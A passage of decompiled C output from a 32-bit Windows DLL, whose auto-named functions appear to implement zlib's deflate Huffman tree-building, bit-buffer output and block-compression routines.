          iVar4 = 6;
          iVar9 = 3;
        }
        else {
          iVar4 = 7;
          iVar9 = 4;
        }
      }
      local_10 = local_10 + 2;
      local_8 = local_8 + -1;
      iVar7 = iVar6;
      local_14 = uVar5;
    } while (local_8 != 0);
  }
  return;
}



/* Function: FUN_10003720 */

void FUN_10003720(int param_1,int param_2,int param_3)

{
  ushort uVar1;
  int iVar2;
  int in_EAX;
  int iVar3;
  
  iVar3 = *(int *)(in_EAX + 0x16bc);
  if (iVar3 < 0xc) {
    *(ushort *)(in_EAX + 0x16b8) =
         *(ushort *)(in_EAX + 0x16b8) | (ushort)(param_1 + -0x101 << ((byte)iVar3 & 0x1f));
    *(int *)(in_EAX + 0x16bc) = iVar3 + 5;
  }
  else {
    *(ushort *)(in_EAX + 0x16b8) =
         *(ushort *)(in_EAX + 0x16b8) | (ushort)(param_1 + -0x101 << ((byte)iVar3 & 0x1f));
    *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
         *(undefined1 *)(in_EAX + 0x16b8);
    *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
    *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
         *(undefined1 *)(in_EAX + 0x16b9);
    iVar3 = *(int *)(in_EAX + 0x16bc);
    *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
    *(int *)(in_EAX + 0x16bc) = iVar3 + -0xb;
    *(ushort *)(in_EAX + 0x16b8) = (ushort)(param_1 + -0x101) >> (0x10U - (char)iVar3 & 0x1f);
  }
  iVar3 = *(int *)(in_EAX + 0x16bc);
  if (iVar3 < 0xc) {
    *(ushort *)(in_EAX + 0x16b8) =
         *(ushort *)(in_EAX + 0x16b8) | (ushort)(param_2 + -1 << ((byte)iVar3 & 0x1f));
    *(int *)(in_EAX + 0x16bc) = iVar3 + 5;
  }
  else {
    *(ushort *)(in_EAX + 0x16b8) =
         *(ushort *)(in_EAX + 0x16b8) | (ushort)(param_2 + -1 << ((byte)iVar3 & 0x1f));
    *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
         *(undefined1 *)(in_EAX + 0x16b8);
    *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
    *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
         *(undefined1 *)(in_EAX + 0x16b9);
    iVar3 = *(int *)(in_EAX + 0x16bc);
    *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
    *(int *)(in_EAX + 0x16bc) = iVar3 + -0xb;
    *(ushort *)(in_EAX + 0x16b8) = (ushort)(param_2 + -1) >> (0x10U - (char)iVar3 & 0x1f);
  }
  iVar3 = *(int *)(in_EAX + 0x16bc);
  if (iVar3 < 0xd) {
    *(ushort *)(in_EAX + 0x16b8) =
         *(ushort *)(in_EAX + 0x16b8) | (ushort)(param_3 + -4 << ((byte)iVar3 & 0x1f));
    *(int *)(in_EAX + 0x16bc) = iVar3 + 4;
  }
  else {
    *(ushort *)(in_EAX + 0x16b8) =
         *(ushort *)(in_EAX + 0x16b8) | (ushort)(param_3 + -4 << ((byte)iVar3 & 0x1f));
    *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
         *(undefined1 *)(in_EAX + 0x16b8);
    *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
    *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
         *(undefined1 *)(in_EAX + 0x16b9);
    iVar3 = *(int *)(in_EAX + 0x16bc);
    *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
    *(int *)(in_EAX + 0x16bc) = iVar3 + -0xc;
    *(ushort *)(in_EAX + 0x16b8) = (ushort)(param_3 + -4) >> (0x10U - (char)iVar3 & 0x1f);
  }
  iVar3 = 0;
  if (0 < param_3) {
    do {
      iVar2 = *(int *)(in_EAX + 0x16bc);
      if (iVar2 < 0xe) {
        *(ushort *)(in_EAX + 0x16b8) =
             *(ushort *)(in_EAX + 0x16b8) |
             *(short *)(in_EAX + 0xa7e + (uint)(byte)(&DAT_1008253c)[iVar3] * 4) <<
             ((byte)iVar2 & 0x1f);
        *(int *)(in_EAX + 0x16bc) = iVar2 + 3;
      }
      else {
        uVar1 = *(ushort *)(in_EAX + 0xa7e + (uint)(byte)(&DAT_1008253c)[iVar3] * 4);
        *(ushort *)(in_EAX + 0x16b8) = *(ushort *)(in_EAX + 0x16b8) | uVar1 << ((byte)iVar2 & 0x1f);
        *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
             *(undefined1 *)(in_EAX + 0x16b8);
        *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
        *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
             *(undefined1 *)(in_EAX + 0x16b9);
        iVar2 = *(int *)(in_EAX + 0x16bc);
        *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
        *(int *)(in_EAX + 0x16bc) = iVar2 + -0xd;
        *(ushort *)(in_EAX + 0x16b8) = uVar1 >> (0x10U - (char)iVar2 & 0x1f);
      }
      iVar3 = iVar3 + 1;
    } while (iVar3 < param_3);
  }
  FUN_10003210();
  FUN_10003210();
  return;
}



/* Function: FUN_10003980 */

void FUN_10003980(int param_1,int param_2)

{
  ushort uVar1;
  int iVar2;
  int in_EAX;
  byte bVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  int iVar9;
  uint uVar10;
  
  uVar4 = 0;
  if (*(int *)(in_EAX + 0x16a0) != 0) {
    do {
      uVar7 = (uint)*(ushort *)(*(int *)(in_EAX + 0x16a4) + uVar4 * 2);
      uVar8 = (uint)*(byte *)(uVar4 + *(int *)(in_EAX + 0x1698));
      uVar4 = uVar4 + 1;
      iVar5 = *(int *)(in_EAX + 0x16bc);
      bVar3 = (byte)iVar5;
      if (uVar7 == 0) {
        uVar7 = (uint)*(ushort *)(param_1 + 2 + uVar8 * 4);
        if ((int)(0x10 - uVar7) < iVar5) {
          uVar1 = *(ushort *)(param_1 + uVar8 * 4);
          *(ushort *)(in_EAX + 0x16b8) = *(ushort *)(in_EAX + 0x16b8) | uVar1 << (bVar3 & 0x1f);
          *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
               *(undefined1 *)(in_EAX + 0x16b8);
          *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
          *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
               *(undefined1 *)(in_EAX + 0x16b9);
          *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
          iVar5 = *(int *)(in_EAX + 0x16bc) + -0x10 + uVar7;
          *(ushort *)(in_EAX + 0x16b8) = uVar1 >> (0x10U - (char)*(int *)(in_EAX + 0x16bc) & 0x1f);
        }
        else {
          *(ushort *)(in_EAX + 0x16b8) =
               *(ushort *)(in_EAX + 0x16b8) | *(short *)(param_1 + uVar8 * 4) << (bVar3 & 0x1f);
          iVar5 = iVar5 + uVar7;
        }
LAB_10003cbc:
        *(int *)(in_EAX + 0x16bc) = iVar5;
      }
      else {
        uVar6 = (uint)(byte)(&DAT_10082d10)[uVar8];
        uVar10 = (uint)*(ushort *)(param_1 + 0x406 + uVar6 * 4);
        if ((int)(0x10 - uVar10) < iVar5) {
          uVar1 = *(ushort *)(param_1 + 0x404 + uVar6 * 4);
          *(ushort *)(in_EAX + 0x16b8) = *(ushort *)(in_EAX + 0x16b8) | uVar1 << (bVar3 & 0x1f);
          *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
               *(undefined1 *)(in_EAX + 0x16b8);
          *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
          *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
               *(undefined1 *)(in_EAX + 0x16b9);
          iVar5 = *(int *)(in_EAX + 0x16bc);
          *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
          *(uint *)(in_EAX + 0x16bc) = iVar5 + -0x10 + uVar10;
          *(ushort *)(in_EAX + 0x16b8) = uVar1 >> (0x10U - (char)iVar5 & 0x1f);
        }
        else {
          *(ushort *)(in_EAX + 0x16b8) =
               *(ushort *)(in_EAX + 0x16b8) |
               *(short *)(param_1 + 0x404 + uVar6 * 4) << (bVar3 & 0x1f);
          *(uint *)(in_EAX + 0x16bc) = iVar5 + uVar10;
        }
        iVar5 = *(int *)(&DAT_100824c8 + uVar6 * 4);
        if (iVar5 != 0) {
          iVar9 = uVar8 - *(int *)(&DAT_10082e10 + uVar6 * 4);
          iVar2 = *(int *)(in_EAX + 0x16bc);
          if (0x10 - iVar5 < iVar2) {
            *(ushort *)(in_EAX + 0x16b8) =
                 *(ushort *)(in_EAX + 0x16b8) | (ushort)(iVar9 << ((byte)iVar2 & 0x1f));
            *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
                 *(undefined1 *)(in_EAX + 0x16b8);
            *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
            *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
                 *(undefined1 *)(in_EAX + 0x16b9);
            *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
            iVar2 = *(int *)(in_EAX + 0x16bc) + -0x10;
            *(ushort *)(in_EAX + 0x16b8) =
                 (ushort)iVar9 >> (0x10U - (char)*(int *)(in_EAX + 0x16bc) & 0x1f);
          }
          else {
            *(ushort *)(in_EAX + 0x16b8) =
                 *(ushort *)(in_EAX + 0x16b8) | (ushort)(iVar9 << ((byte)iVar2 & 0x1f));
          }
          *(int *)(in_EAX + 0x16bc) = iVar2 + iVar5;
        }
        uVar8 = uVar7 - 1;
        if (uVar8 < 0x100) {
          bVar3 = (&DAT_10082b0f)[uVar7];
        }
        else {
          bVar3 = (&DAT_10082c10)[uVar8 >> 7];
        }
        uVar6 = (uint)bVar3;
        uVar7 = (uint)*(ushort *)(param_2 + 2 + uVar6 * 4);
        iVar5 = *(int *)(in_EAX + 0x16bc);
        if ((int)(0x10 - uVar7) < iVar5) {
          uVar1 = *(ushort *)(param_2 + uVar6 * 4);
          *(ushort *)(in_EAX + 0x16b8) =
               *(ushort *)(in_EAX + 0x16b8) | uVar1 << ((byte)iVar5 & 0x1f);
          *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
               *(undefined1 *)(in_EAX + 0x16b8);
          *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
          *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
               *(undefined1 *)(in_EAX + 0x16b9);
          iVar5 = *(int *)(in_EAX + 0x16bc);
          *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
          *(uint *)(in_EAX + 0x16bc) = iVar5 + -0x10 + uVar7;
          *(ushort *)(in_EAX + 0x16b8) = uVar1 >> (0x10U - (char)iVar5 & 0x1f);
        }
        else {
          *(ushort *)(in_EAX + 0x16b8) =
               *(ushort *)(in_EAX + 0x16b8) |
               *(short *)(param_2 + uVar6 * 4) << ((byte)iVar5 & 0x1f);
          *(uint *)(in_EAX + 0x16bc) = iVar5 + uVar7;
        }
        iVar5 = *(int *)(&DAT_10082550 + uVar6 * 4);
        if (iVar5 != 0) {
          iVar2 = *(int *)(in_EAX + 0x16bc);
          iVar9 = uVar8 - *(int *)(&DAT_10082e88 + uVar6 * 4);
          if (0x10 - iVar5 < iVar2) {
            *(ushort *)(in_EAX + 0x16b8) =
                 *(ushort *)(in_EAX + 0x16b8) | (ushort)(iVar9 << ((byte)iVar2 & 0x1f));
            *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
                 *(undefined1 *)(in_EAX + 0x16b8);
            *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
            *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
                 *(undefined1 *)(in_EAX + 0x16b9);
            *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
            iVar5 = *(int *)(in_EAX + 0x16bc) + -0x10 + iVar5;
            *(ushort *)(in_EAX + 0x16b8) =
                 (ushort)iVar9 >> (0x10U - (char)*(int *)(in_EAX + 0x16bc) & 0x1f);
          }
          else {
            *(ushort *)(in_EAX + 0x16b8) =
                 *(ushort *)(in_EAX + 0x16b8) | (ushort)(iVar9 << ((byte)iVar2 & 0x1f));
            iVar5 = iVar2 + iVar5;
          }
          goto LAB_10003cbc;
        }
      }
    } while (uVar4 < *(uint *)(in_EAX + 0x16a0));
  }
  uVar4 = (uint)*(ushort *)(param_1 + 0x402);
  iVar5 = *(int *)(in_EAX + 0x16bc);
  if (iVar5 <= (int)(0x10 - uVar4)) {
    *(ushort *)(in_EAX + 0x16b8) =
         *(ushort *)(in_EAX + 0x16b8) | *(short *)(param_1 + 0x400) << ((byte)iVar5 & 0x1f);
    *(uint *)(in_EAX + 0x16bc) = iVar5 + uVar4;
    *(uint *)(in_EAX + 0x16b4) = (uint)*(ushort *)(param_1 + 0x402);
    return;
  }
  uVar1 = *(ushort *)(param_1 + 0x400);
  *(ushort *)(in_EAX + 0x16b8) = *(ushort *)(in_EAX + 0x16b8) | uVar1 << ((byte)iVar5 & 0x1f);
  *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) = *(undefined1 *)(in_EAX + 0x16b8)
  ;
  *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
  *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) = *(undefined1 *)(in_EAX + 0x16b9)
  ;
  iVar5 = *(int *)(in_EAX + 0x16bc);
  *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
  *(uint *)(in_EAX + 0x16bc) = iVar5 + -0x10 + uVar4;
  *(ushort *)(in_EAX + 0x16b8) = uVar1 >> (0x10U - (char)iVar5 & 0x1f);
  *(uint *)(in_EAX + 0x16b4) = (uint)*(ushort *)(param_1 + 0x402);
  return;
}



/* Function: FUN_10003d90 */

void __fastcall FUN_10003d90(undefined4 param_1,int *param_2)

{
  int iVar1;
  int *piVar2;
  
  iVar1 = 0;
  piVar2 = param_2 + 0x25;
  do {
    if ((short)*piVar2 != 0) break;
    iVar1 = iVar1 + 1;
    piVar2 = piVar2 + 1;
  } while (iVar1 < 9);
  if (iVar1 == 9) {
    iVar1 = 0xe;
    piVar2 = param_2 + 0x34;
    while ((short)piVar2[-1] == 0) {
      if ((short)*piVar2 != 0) {
        *(uint *)(*param_2 + 0x2c) = (uint)(iVar1 == 0x1f);
        return;
      }
      if ((short)piVar2[1] != 0) {
        *(uint *)(*param_2 + 0x2c) = (uint)(iVar1 == 0x1e);
        return;
      }
      if ((short)piVar2[2] != 0) {
        *(uint *)(*param_2 + 0x2c) = (uint)(iVar1 == 0x1d);
        return;
      }
      if ((short)piVar2[3] != 0) {
        *(uint *)(*param_2 + 0x2c) = (uint)(iVar1 == 0x1c);
        return;
      }
      if ((short)piVar2[4] != 0) {
        iVar1 = iVar1 + 5;
        break;
      }
      iVar1 = iVar1 + 6;
      piVar2 = piVar2 + 6;
      if (0x1f < iVar1) {
        *(uint *)(*param_2 + 0x2c) = (uint)(iVar1 == 0x20);
        return;
      }
    }
  }
  *(uint *)(*param_2 + 0x2c) = (uint)(iVar1 == 0x20);
  return;
}



/* Function: FUN_10003e60 */

void FUN_10003e60(void)

{
  int in_EAX;
  
  if (*(int *)(in_EAX + 0x16bc) == 0x10) {
    *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
         *(undefined1 *)(in_EAX + 0x16b8);
    *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
    *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
         *(undefined1 *)(in_EAX + 0x16b9);
    *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
    *(undefined4 *)(in_EAX + 0x16bc) = 0;
    *(undefined2 *)(in_EAX + 0x16b8) = 0;
    return;
  }
  if (7 < *(int *)(in_EAX + 0x16bc)) {
    *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
         *(undefined1 *)(in_EAX + 0x16b8);
    *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
    *(int *)(in_EAX + 0x16bc) = *(int *)(in_EAX + 0x16bc) + -8;
    *(ushort *)(in_EAX + 0x16b8) = (ushort)*(byte *)(in_EAX + 0x16b9);
  }
  return;
}



/* Function: FUN_10003ee0 */

void FUN_10003ee0(void)

{
  int in_EAX;
  
  if (8 < *(int *)(in_EAX + 0x16bc)) {
    *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
         *(undefined1 *)(in_EAX + 0x16b8);
    *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
    *(undefined1 *)(*(int *)(in_EAX + 0x14) + *(int *)(in_EAX + 8)) =
         *(undefined1 *)(in_EAX + 0x16b9);
    *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
    *(undefined2 *)(in_EAX + 0x16b8) = 0;
    *(undefined4 *)(in_EAX + 0x16bc) = 0;
    return;
  }
  if (0 < *(int *)(in_EAX + 0x16bc)) {
    *(undefined1 *)(*(int *)(in_EAX + 8) + *(int *)(in_EAX + 0x14)) =
         *(undefined1 *)(in_EAX + 0x16b8);
    *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + 1;
  }
  *(undefined2 *)(in_EAX + 0x16b8) = 0;
  *(undefined4 *)(in_EAX + 0x16bc) = 0;
  return;
}



/* Function: FUN_10003f60 */

void __fastcall FUN_10003f60(int param_1,undefined1 *param_2,int param_3)

{
  int iVar1;
  byte bVar2;
  
  iVar1 = FUN_10003ee0();
  *(undefined4 *)(iVar1 + 0x16b4) = 8;
  if (param_3 != 0) {
    *(byte *)(*(int *)(iVar1 + 0x14) + *(int *)(iVar1 + 8)) = (byte)param_1;
    *(int *)(iVar1 + 0x14) = *(int *)(iVar1 + 0x14) + 1;
    bVar2 = (byte)((uint)param_1 >> 8);
    *(byte *)(*(int *)(iVar1 + 0x14) + *(int *)(iVar1 + 8)) = bVar2;
    *(int *)(iVar1 + 0x14) = *(int *)(iVar1 + 0x14) + 1;
    *(byte *)(*(int *)(iVar1 + 8) + *(int *)(iVar1 + 0x14)) = ~(byte)param_1;
    *(int *)(iVar1 + 0x14) = *(int *)(iVar1 + 0x14) + 1;
    *(byte *)(*(int *)(iVar1 + 8) + *(int *)(iVar1 + 0x14)) = ~bVar2;
    *(int *)(iVar1 + 0x14) = *(int *)(iVar1 + 0x14) + 1;
  }
  if (param_1 != 0) {
    do {
      param_1 = param_1 + -1;
      *(undefined1 *)(*(int *)(iVar1 + 0x14) + *(int *)(iVar1 + 8)) = *param_2;
      *(int *)(iVar1 + 0x14) = *(int *)(iVar1 + 0x14) + 1;
      param_2 = param_2 + 1;
    } while (param_1 != 0);
  }
  return;
}



/* Function: FUN_10004060 */

void __fastcall FUN_10004060(undefined4 param_1,int param_2)

{
  uint uVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  ushort uVar5;
  uint uVar6;
  int unaff_EBX;
  uint uVar7;
  int unaff_EDI;
  ushort auStack_20 [16];
  
  uVar5 = 0;
  iVar2 = 1;
  do {
    uVar5 = (*(short *)(param_2 + iVar2 * 2 + -2) + uVar5) * 2;
    auStack_20[iVar2] = uVar5;
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x10);
  iVar2 = 0;
  if (-1 < unaff_EBX) {
    do {
      uVar6 = (uint)*(ushort *)(unaff_EDI + 2 + iVar2 * 4);
      if (uVar6 != 0) {
        uVar3 = (uint)auStack_20[uVar6];
        auStack_20[uVar6] = auStack_20[uVar6] + 1;
        uVar1 = 0;
        do {
          uVar4 = uVar1;
          uVar7 = uVar3 & 1;
          uVar6 = uVar6 - 1;
          uVar3 = uVar3 >> 1;
          uVar1 = (uVar4 | uVar7) * 2;
        } while (0 < (int)uVar6);
        *(ushort *)(unaff_EDI + iVar2 * 4) = (ushort)uVar4 | (ushort)uVar7;
      }
      iVar2 = iVar2 + 1;
    } while (iVar2 <= unaff_EBX);
  }
  return;
}



/* Function: FUN_100040e0 */

void FUN_100040e0(int *param_1)

{
  byte bVar1;
  int iVar2;
  undefined4 uVar3;
  int iVar4;
  byte bVar5;
  int iVar6;
  int iVar7;
  int iVar8;
  int unaff_ESI;
  
  iVar2 = *param_1;
  iVar7 = ((int *)param_1[2])[3];
  iVar8 = *(int *)param_1[2];
  iVar6 = -1;
  iVar4 = 0;
  *(undefined4 *)(unaff_ESI + 0x1450) = 0;
  *(undefined4 *)(unaff_ESI + 0x1454) = 0x23d;
  if (0 < iVar7) {
    do {
      if (*(short *)(iVar2 + iVar4 * 4) == 0) {
        *(undefined2 *)(iVar2 + 2 + iVar4 * 4) = 0;
      }
      else {
        *(int *)(unaff_ESI + 0x1450) = *(int *)(unaff_ESI + 0x1450) + 1;
        *(int *)(unaff_ESI + 0xb5c + *(int *)(unaff_ESI + 0x1450) * 4) = iVar4;
        *(undefined1 *)(iVar4 + 0x1458 + unaff_ESI) = 0;
        iVar6 = iVar4;
      }
      iVar4 = iVar4 + 1;
    } while (iVar4 < iVar7);
  }
  iVar4 = *(int *)(unaff_ESI + 0x1450);
  while (iVar4 < 2) {
    if (iVar6 < 2) {
      iVar4 = iVar6 + 1;
      iVar6 = iVar4;
    }
    else {
      iVar4 = 0;
    }
    *(int *)(unaff_ESI + 0x1450) = *(int *)(unaff_ESI + 0x1450) + 1;
    *(int *)(unaff_ESI + 0xb5c + *(int *)(unaff_ESI + 0x1450) * 4) = iVar4;
    *(undefined2 *)(iVar2 + iVar4 * 4) = 1;
    *(undefined1 *)(unaff_ESI + 0x1458 + iVar4) = 0;
    *(int *)(unaff_ESI + 0x16a8) = *(int *)(unaff_ESI + 0x16a8) + -1;
    if (iVar8 != 0) {
      *(int *)(unaff_ESI + 0x16ac) =
           *(int *)(unaff_ESI + 0x16ac) - (uint)*(ushort *)(iVar8 + 2 + iVar4 * 4);
    }
    iVar4 = *(int *)(unaff_ESI + 0x1450);
  }
  param_1[1] = iVar6;
  for (iVar8 = *(int *)(unaff_ESI + 0x1450) / 2; 0 < iVar8; iVar8 = iVar8 + -1) {
    FUN_10002e30(iVar8);
  }
  do {
    uVar3 = *(undefined4 *)(unaff_ESI + 0xb5c + *(int *)(unaff_ESI + 0x1450) * 4);
    iVar8 = *(int *)(unaff_ESI + 0xb60);
    *(int *)(unaff_ESI + 0x1450) = *(int *)(unaff_ESI + 0x1450) + -1;
    *(undefined4 *)(unaff_ESI + 0xb60) = uVar3;
    FUN_10002e30(1);
    iVar6 = *(int *)(unaff_ESI + 0xb60);
    *(int *)(unaff_ESI + 0x1454) = *(int *)(unaff_ESI + 0x1454) + -1;
    *(int *)(unaff_ESI + 0xb5c + *(int *)(unaff_ESI + 0x1454) * 4) = iVar8;
    *(int *)(unaff_ESI + 0x1454) = *(int *)(unaff_ESI + 0x1454) + -1;
    *(int *)(unaff_ESI + 0xb5c + *(int *)(unaff_ESI + 0x1454) * 4) = iVar6;
    *(short *)(iVar2 + iVar7 * 4) = *(short *)(iVar2 + iVar6 * 4) + *(short *)(iVar2 + iVar8 * 4);
    bVar5 = *(byte *)(unaff_ESI + 0x1458 + iVar6);
    bVar1 = *(byte *)(unaff_ESI + 0x1458 + iVar8);
    if (bVar5 <= bVar1) {
      bVar5 = bVar1;
    }
    *(byte *)(unaff_ESI + 0x1458 + iVar7) = bVar5 + 1;
    *(short *)(iVar2 + 2 + iVar6 * 4) = (short)iVar7;
    *(short *)(iVar2 + 2 + iVar8 * 4) = (short)iVar7;
    *(int *)(unaff_ESI + 0xb60) = iVar7;
    iVar7 = iVar7 + 1;
    FUN_10002e30(1);
  } while (1 < *(int *)(unaff_ESI + 0x1450));
  *(int *)(unaff_ESI + 0x1454) = *(int *)(unaff_ESI + 0x1454) + -1;
  *(undefined4 *)(unaff_ESI + 0xb5c + *(int *)(unaff_ESI + 0x1454) * 4) =
       *(undefined4 *)(unaff_ESI + 0xb60);
  FUN_10002f00();
  FUN_10004060();
  return;
}



/* Function: FUN_100042e0 */

void FUN_100042e0(void)

{
  int in_EAX;
  int iVar1;
  
  FUN_10003120();
  FUN_10003120();
  FUN_100040e0(in_EAX + 0xb30);
  iVar1 = 0x12;
  do {
    if (*(short *)(in_EAX + 0xa7e + (uint)(byte)(&DAT_1008253c)[iVar1] * 4) != 0) {
LAB_1000439d:
      *(int *)(in_EAX + 0x16a8) = *(int *)(in_EAX + 0x16a8) + iVar1 * 3 + 0x11;
      return;
    }
    if (*(short *)(in_EAX + 0xa7e + (uint)(byte)(&UNK_1008253b)[iVar1] * 4) != 0) {
      *(int *)(in_EAX + 0x16a8) = *(int *)(in_EAX + 0x16a8) + (iVar1 + -1) * 3 + 0x11;
      return;
    }
    if (*(short *)(in_EAX + 0xa7e + (uint)(byte)(&UNK_1008253a)[iVar1] * 4) != 0) {
      *(int *)(in_EAX + 0x16a8) = *(int *)(in_EAX + 0x16a8) + (iVar1 + -2) * 3 + 0x11;
      return;
    }
    if (*(short *)(in_EAX + 0xa7e + (uint)(byte)(&UNK_10082539)[iVar1] * 4) != 0) {
      iVar1 = iVar1 + -3;
      goto LAB_1000439d;
    }
    iVar1 = iVar1 + -4;
    if (iVar1 < 3) {
      *(int *)(in_EAX + 0x16a8) = *(int *)(in_EAX + 0x16a8) + iVar1 * 3 + 0x11;
      return;
    }
  } while( true );
}



/* Function: FUN_100043b0 */

void FUN_100043b0(int param_1,undefined4 param_2,undefined4 param_3,int param_4)

{
  int iVar1;
  
  iVar1 = *(int *)(param_1 + 0x16bc);
  if (0xd < iVar1) {
    *(ushort *)(param_1 + 0x16b8) =
         *(ushort *)(param_1 + 0x16b8) | (ushort)(param_4 << ((byte)iVar1 & 0x1f));
    *(undefined1 *)(*(int *)(param_1 + 8) + *(int *)(param_1 + 0x14)) =
         *(undefined1 *)(param_1 + 0x16b8);
    *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) + 1;
    *(undefined1 *)(*(int *)(param_1 + 0x14) + *(int *)(param_1 + 8)) =
         *(undefined1 *)(param_1 + 0x16b9);
    iVar1 = *(int *)(param_1 + 0x16bc);
    *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) + 1;
    *(int *)(param_1 + 0x16bc) = iVar1 + -0xd;
    *(ushort *)(param_1 + 0x16b8) = (ushort)param_4 >> (0x10U - (char)iVar1 & 0x1f);
    FUN_10003f60(1);
    return;
  }
  *(int *)(param_1 + 0x16bc) = iVar1 + 3;
  *(ushort *)(param_1 + 0x16b8) =
       *(ushort *)(param_1 + 0x16b8) | (ushort)(param_4 << ((byte)iVar1 & 0x1f));
  FUN_10003f60(1);
  return;
}



/* Function: FUN_10004450 */

void FUN_10004450(int param_1)

{
  int iVar1;
  int iVar2;
  
  iVar2 = *(int *)(param_1 + 0x16bc);
  *(ushort *)(param_1 + 0x16b8) =
       *(ushort *)(param_1 + 0x16b8) | (ushort)(2 << ((byte)iVar2 & 0x1f));
  if (iVar2 < 0xe) {
    *(int *)(param_1 + 0x16bc) = iVar2 + 3;
  }
  else {
    *(undefined1 *)(*(int *)(param_1 + 8) + *(int *)(param_1 + 0x14)) =
         *(undefined1 *)(param_1 + 0x16b8);
    *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) + 1;
    *(undefined1 *)(*(int *)(param_1 + 0x14) + *(int *)(param_1 + 8)) =
         *(undefined1 *)(param_1 + 0x16b9);
    iVar2 = *(int *)(param_1 + 0x16bc);
    *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) + 1;
    *(int *)(param_1 + 0x16bc) = iVar2 + -0xd;
    *(ushort *)(param_1 + 0x16b8) = 2 >> (0x10U - (char)iVar2 & 0x1f);
  }
  iVar2 = *(int *)(param_1 + 0x16bc);
  *(ushort *)(param_1 + 0x16b8) =
       *(ushort *)(param_1 + 0x16b8) | (ushort)(0 << ((byte)iVar2 & 0x1f));
  if (iVar2 < 10) {
    *(int *)(param_1 + 0x16bc) = iVar2 + 7;
  }
  else {
    *(undefined1 *)(*(int *)(param_1 + 8) + *(int *)(param_1 + 0x14)) =
         *(undefined1 *)(param_1 + 0x16b8);
    *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) + 1;
    *(undefined1 *)(*(int *)(param_1 + 0x14) + *(int *)(param_1 + 8)) =
         *(undefined1 *)(param_1 + 0x16b9);
    iVar2 = *(int *)(param_1 + 0x16bc);
    *(int *)(param_1 + 0x14) = *(int *)(param_1 + 0x14) + 1;
    *(int *)(param_1 + 0x16bc) = iVar2 + -9;
    *(ushort *)(param_1 + 0x16b8) = 0 >> (0x10U - (char)iVar2 & 0x1f);
  }
  iVar1 = FUN_10003e60();
  iVar2 = *(int *)(iVar1 + 0x16bc);
  if ((*(int *)(iVar1 + 0x16b4) - iVar2) + 0xb < 9) {
